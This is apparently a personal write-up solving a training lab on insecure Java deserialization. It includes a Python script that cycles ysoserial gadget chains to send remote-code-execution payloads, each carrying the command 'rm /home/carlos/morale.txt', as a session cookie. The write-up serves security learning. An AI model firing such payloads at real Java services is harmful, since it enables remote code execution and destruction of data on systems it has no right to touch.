[Insecure deserialization](../Insecure%20deserialization.md)
# Description

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

# Solution

Download `ysoserial`
try to create payloads, examine errors, change java version to 11

```sh
sudo apt install openjdk-11-jdk
```

```sh
sudo update-java-alternatives --set java-1.11.0-openjdk-amd64
```

and i wrote script to check every possible payload, 
also pay attention to that you need to **url encode** payload(base64)

```python
import requests
import os
from requests.cookies import CookieConflictError
from tqdm import tqdm
import base64
from urllib import parse

def send_request(payload):
    cookies = {
        'session': parse.quote(open('./payload.txt', 'r').read().strip())
    }
    print('#'*19)
    print(cookies)
    if open('./payload.txt', "r").read():
        res = requests.get('https://0a3b00980379c43d85d7909a00f60012.web-security-academy.net', cookies=cookies)

        print(res.status_code, res.text)


def gen_payloads():
    payload_names = [
        "AspectJWeaver",
        "BeanShell1",
        "C3P0",
        "Click1",
        "Clojure",
        "CommonsBeanutils1",
        "CommonsCollections1",
        "CommonsCollections2",
        "CommonsCollections3",
        "CommonsCollections4",
        "CommonsCollections5",
        "CommonsCollections6",
        "CommonsCollections7",
        "FileUpload1",
        "Groovy1",
        "Hibernate1",
        "Hibernate2",
        "JBossInterceptors1",
        "JRMPClient",
        "JRMPListener",
        "JSON1",
        "JavassistWeld1",
        "Jdk7u21",
        "Jython1",
        "MozillaRhino1",
        "MozillaRhino2",
        "Myfaces1",
        "Myfaces2",
        "ROME",
        "Spring1",
        "Spring2",
        "URLDNS",
        "Vaadin1",
        "Wicket1"
    ]
    for payload in tqdm(payload_names):
        # p = pwn.process(['java', '-jar', 'ysoserial-all.jar', payload, 'rm /home/carlos/morale.txt', '| base64'])
        try:
            p = os.system(f"java -jar ysoserial-all.jar {payload} 'rm /home/carlos/morale.txt' | base64 -w 0 > payload.txt")
        except:
            continue

        send_request(p)


if __name__ == "__main__":
    gen_payloads()
```

